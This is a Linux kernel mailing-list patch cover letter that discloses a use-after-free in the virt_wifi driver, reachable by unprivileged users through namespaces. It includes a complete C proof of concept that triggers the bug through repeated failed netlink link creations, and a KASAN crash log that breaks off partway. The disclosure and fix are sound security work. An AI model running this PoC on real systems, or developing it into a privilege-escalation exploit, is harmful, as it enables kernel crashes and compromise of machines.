Received: from mail-pf1-f179.google.com (mail-pf1-f179.google.com [209.85.210.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5D8AF560ABC
	for <linux-wireless@vger.kernel.org>; Wed,  9 Sep 2026 12:37:33 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.179
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788957457; cv=none; b=U02/nfGKmKPfIQMC8W3WJEP7gfB713Qa5dahbqWje+JR9E7Sm+unKIGL5Fufo+UwtusC2+AdH01DYESv9a0LoHORgO+H+X0vPEegk8vm+e3ofGkE0BPdXGLHFXfwTalqnS8l8UgvVH4qvZHnmgPwJALb4OGDpmQKZ95gjvclpZc=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788957457; c=relaxed/simple;
	bh=pKyi8qpaMiLBGFZs82CdDyxU3Mm2EOnF3/X+VcOb+BE=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=i6MjvFBWUEkXCFnEf6RYKvII6d92m676WP/OoYsgrLcOjwEEk7w2EfKdWk/S03EVMOSveOhvO6AZsgE8ayaVdMNvoDbL4E0HsF4o1VoRGtgs8WGo3+TXj1T5Ov2cNPKVzqiTAUgu0J45f1BpLgitBjv5KGiJASHPwcRswXIkrj0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=R5VsIwz/; arc=none smtp.client-ip=209.85.210.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="R5VsIwz/"
Received: by mail-pf1-f179.google.com with SMTP id d2e1a72fcca58-85377c8bc96so5331413b3a.3
        for <linux-wireless@vger.kernel.org>; Wed, 09 Sep 2026 05:37:32 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788957452; x=1789562252; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=lcXPK+KW2aY+6EIevHk8O7h8T/GRDf4hKqf8PymncSk=;
        b=R5VsIwz/4szwRRY11I3hzCKfFzIvwJ3kISPZIFg4K+N9cul0EFiSFpD8v8pWfnvfzD
         o7RJ/VsF6UWMEwLPcMFUFkmfiSqXwVR0jTG07O/b4Lsp7d5os1dcnIU1QHdy7IkYvmX8
         pFMmefZ5jzXvyTHeWfFhCIYYo5pt6KuITmVuUyMKTZJ6HhQ9TeSAvXGVybXuIHVLzFOR
         7r9KWgEsCYl44aURsZh3EtG392h21WsjjdisC1imGrTCOI9rCiPlalYLNFvkIC4oJPBQ
         whPpfPLIGAyzhQjwJsdDWbSnD61z3BLrtoCqaX37gIgs6EYSN5vLXwHxKJL3Ghgk2etx
         J+bA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788957452; x=1789562252;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=lcXPK+KW2aY+6EIevHk8O7h8T/GRDf4hKqf8PymncSk=;
        b=H1fLRyBeBDJOELmysQ3rKJh+PIK8Oy9fLyhRkM8Ffg+P31CFE5y6i46r8+L3JKN8r7
         TzybRKwt9lVnNqbi2LsIulsZjTMptxaftTNWr5XTx60C9QY7NWz5Pru+pIPeITC6CjZ2
         SibC7PLlPJKs0JLujJjm6cCGE2jwpNIxZe4k1y/QQCxEZF2O4AehireSBroPP7fLbfv0
         lQS2p+V3SvEQqbiQrJ4Sp6Q18zd79lfVr/R1GTmoNUL83Fh77cI8vCQvKkqTqwxbj4qK
         mjCTHNf8I4Tl9DEnZMfs+45FPRrrSt0CpKAs/7x1ud1bHSsqs7BjUsh6KZyyFgTvQwTX
         7jkA==
X-Forwarded-Encrypted: i=1; AKwUvBz0Wzlsv9BoEu5UbJNbax1mgnBO4bZ3JdJDdj03hHsqykq0o8v5zthXX0FrHgscNeymZhUVCBqZDND0TqliQw==@vger.kernel.org
X-Gm-Message-State: AFuF++n3rPbAcL18KPH6PJ9tTRYKiD8ODx4l0+Rhnu81KV+edgmccY4P
	iU3ABDNn4K25pL5WAoYEk/5eVOTY3Vfem+T4RNkh97PAY4HxBLppmX8oQkdWtVWkzZRIrWIs0RI
	TUDw0/ycTkf4=
X-Gm-Gg: AYBFou07CYET2dCuA+NWxeN1qo8ulyXBXMNYuXgQf9sIIxoC3tqfkynMbNioGmklmH1
	9RC6MewhlHHrzQYv8e+M8M9eDmFpBEd2k5jSWfKu2zirb8smNpqC+HTeQ6b1IYDY0wA4euG60AJ
	Hw1bzyxEpFO4uddoSq5vm/Cq0eAuagLWJRkV68MHLRJdd0Wswcebz+TSv8ygzWA4ZtJoHmdkyoh
	yU1X6iIoe6F6Tv9trnOYDM2m41NGwrD7syDAERHOCr6UgWWTBbfeF4R4zKUWXUT/g4wdINHoJ4Z
	PkKq3tFhu3pYoJydGBslTijkoU2g58d+wRBhOBmwV3mFqpTTTA1WT8agEVwfl53OGe7G8/pv2a0
	pWY4XWZZqfU1eUXL5wxvsWjqGMsILKn6lQYZJsk11J94P3FTeWFw0O5pCTYUuxjDT8ZUx1Sl2v1
	PIrG/nyGpppTdxtRXRnnt15jlDz5clu6lL14HhFNnHyuZIOH5tGzop2ibkUH2BanurPjl+QKpw9
	ws5swCgZx3TU7+vfA+itQirw1HNaQ==
X-Received: by 2002:a05:6a00:950c:b0:848:34ad:3d6c with SMTP id d2e1a72fcca58-86168495ed3mr50625218b3a.15.1788957451577;
        Wed, 09 Sep 2026 05:37:31 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-86153027951sm6828614b3a.40.2026.09.09.05.37.25
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 09 Sep 2026 05:37:30 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: Johannes Berg <johannes@sipsolutions.net>,
	linux-wireless@vger.kernel.org
Cc: Zihan Xi <zihanx@nebusec.ai>,
	netdev@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	Jakub Kicinski <kuba@kernel.org>,
	Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
	Mariano Baragiola <mbaragiola@linux.com>,
	James Guan <guan_yufei@163.com>,
	Kees Cook <kees@kernel.org>,
	Miri Korenblit <miriam.rachel.korenblit@intel.com>,
	Alexander Popov <alex.popov@linux.com>,
	Breno Leitao <leitao@debian.org>,
	Alistair Strachan <astrachan@google.com>,
	Tristan Muntsinger <muntsinger@google.com>,
	Cody Schuffelen <schuffelen@google.com>,
	Greg Hartman <ghartman@google.com>
Subject: [PATCH v2 0/1] wifi: virt_wifi: don't transfer operstate before register
Date: Wed,  9 Sep 2026 12:37:17 +0000
Message-ID: <cover.1788948455.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in drivers/net/wireless/virtual/
virt_wifi.c. The bug is reachable by a non-root user via user and
net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

v1 added a NETREG_UNINITIALIZED check in linkwatch_fire_event().
Jakub asked to fix the virt_wifi caller instead of silently ignoring
the event in the helper. This version moves the operstate transfer
in virt_wifi_newlink() to after netdev_upper_dev_link().

virt_wifi_newlink() calls netif_stacked_transfer_operstate() before
register_netdevice(). If the lower device is dormant, that queues
the still-uninitialized netdev on lweventlist. If registration then
fails, free_netdev() immediately frees it, and a later
linkwatch_fire_event() use-after-frees the list entry.

macvlan, ipvlan, macsec and qmi_wwan already transfer operstate
after a successful register. virt_wifi was the only caller I found
that does it beforehand.

The order has been this way since virt_wifi was added in commit
c7cdba31ed8b ("mac80211-next: rtnetlink wifi simulation device").

The attached PoC creates a dummy, sets it dormant, and repeats
RTM_NEWLINK(kind=virt_wifi) with ifname "bad/name". The KASAN report
is from the unpatched run.

The attached log used panic_on_warn=0. With the default
panic_on_warn=1 the same path usually warns in free_netdev() first,
because the stale linkwatch netdev_hold() is still outstanding.

With this change, 1024 failed virt_wifi creates no longer hit KASAN,
and a normal dummy + virt_wifi device still comes up.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <errno.h>
#include <linux/if.h>
#include <linux/if_link.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <sys/ioctl.h>

#ifndef IFLA_INFO_KIND
#define IFLA_INFO_KIND 1
#endif

static int addattr_l(struct nlmsghdr *n, size_t maxlen, int type,
		     const void *data, size_t alen)
{
	size_t len = RTA_LENGTH(alen);
	size_t newlen = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
	struct rtattr *rta;

	if (newlen > maxlen) {
		errno = EOVERFLOW;
		return -1;
	}

	rta = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = len;
	if (alen)
		memcpy(RTA_DATA(rta), data, alen);
	n->nlmsg_len = newlen;
	return 0;
}

static int addattr8(struct nlmsghdr *n, size_t maxlen, int type, uint8_t data)
{
	return addattr_l(n, maxlen, type, &data, sizeof(data));
}

static int addattr32(struct nlmsghdr *n, size_t maxlen, int type, uint32_t data)
{
	return addattr_l(n, maxlen, type, &data, sizeof(data));
}

static int addattrstrz(struct nlmsghdr *n, size_t maxlen, int type,
		       const char *str)
{
	return addattr_l(n, maxlen, type, str, strlen(str) + 1);
}

static struct rtattr *addattr_nest(struct nlmsghdr *n, size_t maxlen, int type)
{
	struct rtattr *nest;

	nest = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
	if (addattr_l(n, maxlen, type, NULL, 0) < 0)
		return NULL;
	return nest;
}

static void addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest)
{
	nest->rta_len = (char *)n + n->nlmsg_len - (char *)nest;
}

static int nl_talk(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl nladdr = {
		.nl_family = AF_NETLINK,
	};
	struct iovec iov = {
		.iov_base = nlh,
		.iov_len = nlh->nlmsg_len,
	};
	struct msghdr msg = {
		.msg_name = &nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	char buf[8192];
	ssize_t len;

	if (sendmsg(fd, &msg, 0) < 0)
		return -1;

	for (;;) {
		struct nlmsghdr *h;

		len = recv(fd, buf, sizeof(buf), 0);
		if (len < 0) {
			if (errno == EINTR)
				continue;
			return -1;
		}

		for (h = (struct nlmsghdr *)buf; NLMSG_OK(h, (unsigned int)len);
		     h = NLMSG_NEXT(h, len)) {
			if (h->nlmsg_seq != nlh->nlmsg_seq)
				continue;
			if (h->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = NLMSG_DATA(h);

				if (h->nlmsg_len < NLMSG_LENGTH(sizeof(*err))) {
					errno = EPROTO;
					return -1;
				}
				if (err->error == 0)
					return 0;
				errno = -err->error;
				return -1;
			}
		}
	}
}

static int open_rtnl(void)
{
	struct sockaddr_nl local = {
		.nl_family = AF_NETLINK,
	};
	int fd;

	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
	if (fd < 0)
		return -1;
	if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0) {
		close(fd);
		return -1;
	}
	return fd;
}

static uint32_t next_seq(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (uint32_t)(ts.tv_nsec ^ ts.tv_sec ^ getpid());
}

static int create_dummy(int fd, const char *ifname)
{
	struct {
		struct nlmsghdr nlh;
		struct ifinfomsg ifi;
		char buf[512];
	} req = {
		.nlh = {
			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
			.nlmsg_type = RTM_NEWLINK,
			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
				       NLM_F_CREATE | NLM_F_EXCL,
			.nlmsg_seq = next_seq(),
		},
		.ifi = {
			.ifi_family = AF_UNSPEC,
		},
	};
	struct rtattr *linkinfo;

	if (addattrstrz(&req.nlh, sizeof(req), IFLA_IFNAME, ifname) < 0)
		return -1;

	linkinfo = addattr_nest(&req.nlh, sizeof(req), IFLA_LINKINFO);
	if (!linkinfo)
		return -1;

	if (addattrstrz(&req.nlh, sizeof(req), IFLA_INFO_KIND, "dummy") < 0)
		return -1;
	addattr_nest_end(&req.nlh, linkinfo);

	return nl_talk(fd, &req.nlh);
}

static int set_link_up(int fd, int ifindex)
{
	struct {
		struct nlmsghdr nlh;
		struct ifinfomsg ifi;
		char buf[128];
	} req = {
		.nlh = {
			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
			.nlmsg_type = RTM_SETLINK,
			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
			.nlmsg_seq = next_seq(),
		},
		.ifi = {
			.ifi_family = AF_UNSPEC,
			.ifi_index = ifindex,
			.ifi_change = IFF_UP,
			.ifi_flags = IFF_UP,
		},
	};

	return nl_talk(fd, &req.nlh);
}

static int set_operstate(int fd, int ifindex, uint8_t operstate)
{
	struct {
		struct nlmsghdr nlh;
		struct ifinfomsg ifi;
		char buf[128];
	} req = {
		.nlh = {
			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
			.nlmsg_type = RTM_SETLINK,
			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
			.nlmsg_seq = next_seq(),
		},
		.ifi = {
			.ifi_family = AF_UNSPEC,
			.ifi_index = ifindex,
		},
	};

	if (addattr8(&req.nlh, sizeof(req), IFLA_OPERSTATE, operstate) < 0)
		return -1;

	return nl_talk(fd, &req.nlh);
}

static int trigger_virt_wifi_uaf(int fd, int lower_ifindex)
{
	const char *bad_name = "bad/name";
	struct {
		struct nlmsghdr nlh;
		struct ifinfomsg ifi;
		char buf[512];
	} req = {
		.nlh = {
			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
			.nlmsg_type = RTM_NEWLINK,
			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
				       NLM_F_CREATE | NLM_F_EXCL,
			.nlmsg_seq = next_seq(),
		},
		.ifi = {
			.ifi_family = AF_UNSPEC,
		},
	};
	struct rtattr *linkinfo;

	if (addattrstrz(&req.nlh, sizeof(req), IFLA_IFNAME, bad_name) < 0)
		return -1;
	if (addattr32(&req.nlh, sizeof(req), IFLA_LINK, lower_ifindex) < 0)
		return -1;

	linkinfo = addattr_nest(&req.nlh, sizeof(req), IFLA_LINKINFO);
	if (!linkinfo)
		return -1;
	if (addattrstrz(&req.nlh, sizeof(req), IFLA_INFO_KIND, "virt_wifi") < 0)
		return -1;
	addattr_nest_end(&req.nlh, linkinfo);

	return nl_talk(fd, &req.nlh);
}

static int query_link(int fd, const char *ifname, int *ifindex, uint8_t *operstate)
{
	struct {
		struct nlmsghdr nlh;
		struct ifinfomsg ifi;
		char buf[256];
	} req = {
		.nlh = {
			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
			.nlmsg_type = RTM_GETLINK,
			.nlmsg_flags = NLM_F_REQUEST,
			.nlmsg_seq = next_seq(),
		},
		.ifi = {
			.ifi_family = AF_UNSPEC,
		},
	};
	struct sockaddr_nl nladdr = {
		.nl_family = AF_NETLINK,
	};
	struct iovec iov = {
		.iov_base = &req,
		.iov_len = req.nlh.nlmsg_len,
	};
	struct msghdr msg = {
		.msg_name = &nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	char buf[4096];
	ssize_t len;

	if (addattrstrz(&req.nlh, sizeof(req), IFLA_IFNAME, ifname) < 0)
		return -1;

	if (sendmsg(fd, &msg, 0) < 0)
		return -1;

	for (;;) {
		struct nlmsghdr *h;

		len = recv(fd, buf, sizeof(buf), 0);
		if (len < 0) {
			if (errno == EINTR)
				continue;
			return -1;
		}

		for (h = (struct nlmsghdr *)buf; NLMSG_OK(h, (unsigned int)len);
		     h = NLMSG_NEXT(h, len)) {
			struct ifinfomsg *ifi;
			struct rtattr *rta;
			int attrlen;

			if (h->nlmsg_seq != req.nlh.nlmsg_seq)
				continue;
			if (h->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = NLMSG_DATA(h);

				if (err->error == 0) {
					errno = ENOENT;
					return -1;
				}
				errno = -err->error;
				return -1;
			}
			if (h->nlmsg_type != RTM_NEWLINK)
				continue;

			ifi = NLMSG_DATA(h);
			if (ifindex)
				*ifindex = ifi->ifi_index;
			if (operstate)
				*operstate = IF_OPER_UNKNOWN;

			attrlen = h->nlmsg_len - NLMSG_LENGTH(sizeof(*ifi));
			for (rta = IFLA_RTA(ifi); RTA_OK(rta, attrlen);
			     rta = RTA_NEXT(rta, attrlen)) {
				if (operstate && rta->rta_type == IFLA_OPERSTATE &&
				    RTA_PAYLOAD(rta) >= sizeof(uint8_t))
					*operstate = *(uint8_t *)RTA_DATA(rta);
			}
			return 0;
		}
	}
}

static const char *operstate_name(uint8_t operstate)
{
	switch (operstate) {
	case IF_OPER_NOTPRESENT:
		return "notpresent";
	case IF_OPER_DOWN:
		return "down";
	case IF_OPER_LOWERLAYERDOWN:
		return "lowerlayerdown";
	case IF_OPER_TESTING:
		return "testing";
	case IF_OPER_DORMANT:
		return "dormant";
	case IF_OPER_UP:
		return "up";
	case IF_OPER_UNKNOWN:
	default:
		return "unknown";
	}
}


static int ifname_to_index(const char *ifname)
{
	struct ifreq ifr;
	int s, ifindex;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
		close(s);
		return -1;
	}
	ifindex = ifr.ifr_ifindex;
	close(s);
	return ifindex;
}

static int read_sysfs_operstate(const char *ifname, char *buf, size_t buflen)
{
	char path[128];
	FILE *f;
	size_t n;

	snprintf(path, sizeof(path), "/sys/class/net/%s/operstate", ifname);
	f = fopen(path, "r");
	if (!f)
		return -1;
	if (!fgets(buf, buflen, f)) {
		fclose(f);
		return -1;
	}
	fclose(f);
	n = strlen(buf);
	if (n && buf[n - 1] == '\n')
		buf[n - 1] = '\0';
	return 0;
}

int main(int argc, char **argv)
{
	char lower_name[IFNAMSIZ];
	long attempts = 1024;
	int fd;
	int ifindex;
	uint8_t operstate;
	long i;

	if (argc > 1) {
		char *end;

		errno = 0;
		attempts = strtol(argv[1], &end, 0);
		if (errno || *end != '\0' || attempts <= 0) {
			fprintf(stderr, "invalid attempt count: %s\n", argv[1]);
			return 1;
		}
	}

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	snprintf(lower_name, sizeof(lower_name), "vwlower%d", getpid());

	fd = open_rtnl();
	if (fd < 0) {
		perror("open_rtnl");
		return 1;
	}

	if (create_dummy(fd, lower_name) < 0) {
		perror("create_dummy");
		close(fd);
		return 1;
	}

	ifindex = ifname_to_index(lower_name);
	if (ifindex <= 0) {
		perror("ifname_to_index");
		close(fd);
		return 1;
	}

	printf("created lower device %s (ifindex %d)\n", lower_name, ifindex);

	if (set_link_up(fd, ifindex) < 0) {
		perror("set_link_up");
		close(fd);
		return 1;
	}

	if (set_operstate(fd, ifindex, IF_OPER_DORMANT) < 0) {
		perror("set_operstate");
		close(fd);
		return 1;
	}

	{
		char oper_buf[32];

		if (read_sysfs_operstate(lower_name, oper_buf, sizeof(oper_buf)) < 0)
			printf("%s ifindex %d, sysfs operstate unavailable: %s\n",
			       lower_name, ifindex, strerror(errno));
		else
			printf("%s ifindex %d, sysfs operstate: %s\n",
			       lower_name, ifindex, oper_buf);
	}
	printf("triggering %ld virt_wifi registration failures with invalid ifname \"bad/name\"\n",
	       attempts);

	for (i = 1; i <= attempts; i++) {
		if (trigger_virt_wifi_uaf(fd, ifindex) == 0) {
			printf("[%ld] unexpectedly created virt_wifi device\n", i);
			continue;
		}

		if (errno != EINVAL)
			printf("[%ld] virt_wifi create error: %s\n",
			       i, strerror(errno));

		if ((i % 128) == 0)
			printf("completed %ld attempts\n", i);
	}

	printf("waiting for linkwatch worker\n");
	sleep(5);

	close(fd);
	return 0;
}
------END poc.c--------

----BEGIN crash log----

[    8.202464] net vwlower267: can't register_netdevice: -22
[    8.203917] ==================================================================
[    8.203925] BUG: KASAN: slab-use-after-free in __list_add_valid_or_report (lib/list_debug.c:32)
[    8.203956] Read of size 8 at addr ffff888007024588 by task poc/267
[    8.203958]
[    8.203960] CPU: 1 UID: 0 PID: 267 Comm: poc Not tainted 7.2.0-g2f38e26a5741 #2 PREEMPT(lazy)
[    8.203963] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[    8.203965] Call Trace:
[    8.203966]  <TASK>
[    8.203967]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[    8.203972]  print_report (mm/kasan/report.c:378 mm/kasan/report.c:482)
[    8.203975]  ? __pfx__raw_spin_lock_irqsave (kernel/locking/spinlock.c:190)
[    8.203979]  ? __list_add_valid_or_report (lib/list_debug.c:32)
[    8.203981]  kasan_report (mm/kasan/report.c:595)
[    8.203984]  ? __list_add_valid_or_report (lib/list_debug.c:32)
[    8.203986]  __list_add_valid_or_report (lib/list_debug.c:32)
[    8.203989]  linkwatch_fire_event (include/linux/list.h:419 (discriminator 2) net/core/link_watch.c:129 (discriminator 2) net/core/link_watch.c:329 (discriminator 2) net/core/link_watch.c:319 (discriminator 2))
[    8.203992]  netif_stacked_transfer_operstate (include/linux/netdevice.h:4665 net/core/dev.c:11199)
[    8.203996]  virt_wifi_newlink (drivers/net/wireless/virtual/virt_wifi.c:560)
[    8.203999]  ? nla_strscpy (lib/nlattr.c:795)
[    8.204003]  rtnl_newlink (net/core/rtnetlink.c:3969 net/core/rtnetlink.c:4098 net/core/rtnetlink.c:4215)
[    8.204005]  ? __pfx_rtnl_newlink (net/core/rtnetlink.c:2944)
[    8.204008]  ? __pfx_stack_trace_consume_entry (usercopy_64.c:?)
[    8.204011]  ? kernel_text_address (include/linux/kprobes.h:332 kernel/extable.c:123 kernel/extable.c:94)
[    8.204014]  ? arch_stack_walk (arch/x86/kernel/stacktrace.c:26)
[    8.204017]  ? __pfx_stack_trace_save (kernel/stacktrace.c:397)
[    8.204020]  ? security_capable (security/security.c:660 (discriminator 8))
[    8.204023]  ? __pfx_rtnl_newlink (net/core/rtnetlink.c:2944)
[    8.204026]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
[    8.204029]  ? __pfx_rtnetlink_rcv_msg (include/net/netlink.h:1307 (discriminator 1))
[    8.204032]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[    8.204035]  ? __pfx_rtnetlink_rcv_msg (include/net/netlink.h:1307 (discriminator 1))
[    8.204038]  ? __pfx_netlink_rcv_skb (include/linux/skbuff.h:2718)
[    8.204040]  ? __asan_memset (mm/kasan/shadow.c:84 (discriminator 1))
[    8.204043]  ? _copy_from_iter (include/linux/instrumented.h:146 lib/iov_iter.c:66 include/linux/iov_iter.h:30 include/linux/iov_iter.h:302 include/linux/iov_iter.h:330 lib/iov_iter.c:261 lib/iov_iter.c:272)
[    8.204046]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
[    8.204048]  ? __pfx_netlink_unicast (arch/x86/include/asm/bitops.h:202)
[    8.204051]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
[    8.204053]  ? __pfx_netlink_sendmsg (include/net/net_namespace.h:422)
[    8.204056]  ? _copy_from_user (include/linux/instrumented.h:146 include/linux/uaccess.h:184 lib/usercopy.c:18)
[    8.204059]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
[    8.204062]  ? __pfx_____sys_sendmsg (net/socket.c:1156)
[    8.204064]  ? __pfx_copy_msghdr_from_user (net/socket.c:2619)
[    8.204066]  ? __wake_up (include/linux/spinlock.h:425 kernel/sched/wait.c:128 kernel/sched/wait.c:147)
[    8.204069]  ___sys_sendmsg (net/socket.c:2767)
[    8.204071]  ? __pfx____sys_sendmsg (net/socket.c:2654)
[    8.204074]  ? fdget (include/linux/instrumented.h:82 include/linux/atomic/atomic-instrumented.h:49 fs/file.c:1194 fs/file.c:1208)
[    8.204077]  __sys_sendmsg (net/socket.c:2799)
[    8.204079]  ? __pfx___sys_sendmsg (net/socket.c:2780)
[    8.204089]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[    8.204092]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[    8.204095] RIP: 0033:0x421534
[    8.204097] Code: c2 c0 ff ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b5 0f 1f 00 f3 0f 1e fa 80 3d 2d 4b 09 00 00 74 13 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 4c c3 0f 1f 00 55 48 89 e5 48 83 ec 20 89 55
All code
========
   0:	c2 c0 ff             	ret    $0xffc0
   3:	ff                   	(bad)
   4:	ff f7                	push   %rdi
   6:	d8 64 89 02          	fsubs  0x2(%rcx,%rcx,4)
   a:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  11:	eb b5                	jmp    0xffffffffffffffc8
  13:	0f 1f 00             	nopl   (%rax)
  16:	f3 0f 1e fa          	endbr64
  1a:	80 3d 2d 4b 09 00 00 	cmpb   $0x0,0x94b2d(%rip)        # 0x94b4e
  21:	74 13                	je     0x36
  23:	b8 2e 00 00 00       	mov    $0x2e,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 4c                	ja     0x7e
  32:	c3                   	ret
  33:	0f 1f 00             	nopl   (%rax)
  36:	55                   	push   %rbp
  37:	48 89 e5             	mov    %rsp,%rbp
  3a:	48 83 ec 20          	sub    $0x20,%rsp
  3e:	89                   	.byte 0x89
  3f:	55                   	push   %rbp

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 4c                	ja     0x54
   8:	c3                   	ret
   9:	0f 1f 00             	nopl   (%rax)
   c:	55                   	push   %rbp
   d:	48 89 e5             	mov    %rsp,%rbp
  10:	48 83 ec 20          	sub    $0x20,%rsp
  14:	89                   	.byte 0x89
  15:	55                   	push   %rbp
[    8.204099] RSP: 002b:00007fffc3b290d8 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
[    8.204102] RAX: ffffffffffffffda RBX: 00007fffc3b2b1a0 RCX: 0000000000421534
[    8.204103] RDX: 0000000000000000 RSI: 00007fffc3b29100 RDI: 0000000000000003
[    8.204105] RBP: 0000000000000003 R08: 000000000000000e R09: 00007fcd7daeb000
[    8.204106] R10: 0000000000000001 R11: 0000000000000202 R12: 00007fffc3b2b1a0
[    8.204107] R13: 0000000000000004 R14: 0000000000000002 R15: 00007fffc3b2b1d8
[    8.204109]  </TASK>
[    8.204110]
[    8.204110] Allocated by task 267:
[    8.204112]  kasan_save_stack (mm/kasan/common.c:57)
[    8.204114]  kasan_save_track (mm/kasan/common.c:78)
[    8.204116]  __kasan_kmalloc (mm/kasan/common.c:398 mm/kasan/common.c:415)
[    8.204117]  __kvmalloc_node_noprof (include/linux/kasan.h:263 mm/slub.c:5414 mm/slub.c:7005)
[    8.204120]  alloc_netdev_mqs (net/core/dev.c:12117 (discriminator 2))
[    8.204123]  rtnl_create_link (net/core/rtnetlink.c:3777)
[    8.204125]  rtnl_newlink (net/core/rtnetlink.c:3959 net/core/rtnetlink.c:4098 net/core/rtnetlink.c:4215)
[    8.204127]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
[    8.204129]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[    8.204131]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
[    8.204133]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
